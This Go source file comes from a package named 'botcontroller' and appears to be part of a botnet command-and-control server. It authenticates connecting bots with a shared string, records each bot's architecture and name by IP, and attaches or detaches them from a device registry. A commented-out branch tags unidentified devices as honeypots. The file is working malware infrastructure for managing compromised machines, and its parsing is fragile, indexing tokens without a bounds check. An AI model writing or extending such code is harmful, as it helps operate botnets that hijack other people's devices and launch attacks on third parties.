package botcontroller

/*
	Learn Slices And Work With The Readfunction
*/

import (
	"errors"
	"fmt"
	"net"
	"strings"
)

func identifybot(bot net.Conn) ([]string, error) {

	//  add bot to map And figure out arch/botname

	buf := make([]byte, 120)

	n, err := bot.Read(buf)

	if err != nil || n == 0 {
		return nil, err
	}

	var BotAuth = string(buf[:n])

	if len(BotAuth) < len(authstring) || BotAuth[:len(authstring)] != authstring {
		return nil, errors.New("device failed auth string")
	}

	// [0] Botarch [1] botname
	tokens := strings.Fields(BotAuth[9:])

	return tokens, nil

}

func appendbot(Host string, bot net.Conn) (BotStruct *Device) {

	tokens, err := identifybot(bot)

	if err != nil {
		fmt.Println("<machine> (detached) Error: ", err.Error())
		return nil
	}

	if device, exist := Devices[Host]; exist {
		//fmt.Printf("<machine> (Host) Device %s is already connected closing...\n", Host)
		device.conn.Close()
	}

	if len(tokens) < 2 {
		BotStruct = &Device{conn: bot, Arch: tokens[0], Botname: "unknown", BotIP: Host}
	} else {
		BotStruct = &Device{conn: bot, Arch: tokens[0], Botname: tokens[1], BotIP: Host}
	}

	//if len(tokens) < 2 {
	//	BotStruct = &Device{conn: bot, Arch: "honeypot", Botname: "unknown", BotIP: Host}
	//} else {
	//	BotStruct = &Device{conn: bot, Arch: tokens[0], Botname: tokens[1], BotIP: Host}
	//}

	return BotStruct

}

func (bot *Device) detachBot() {
	if _, exist := Devices[bot.BotIP]; !exist {
		//fmt.Printf("<machine> (error) Device %s:%s Was Not Found Closing..\n", bot.BotIP, bot.Botname)
		return
	}

	mut.Lock()
	delete(Devices, bot.BotIP)
	mut.Unlock()

	fmt.Printf("<machine> (detached) %s %s/%s\n", bot.BotIP, bot.Arch, bot.Botname)

	return

}
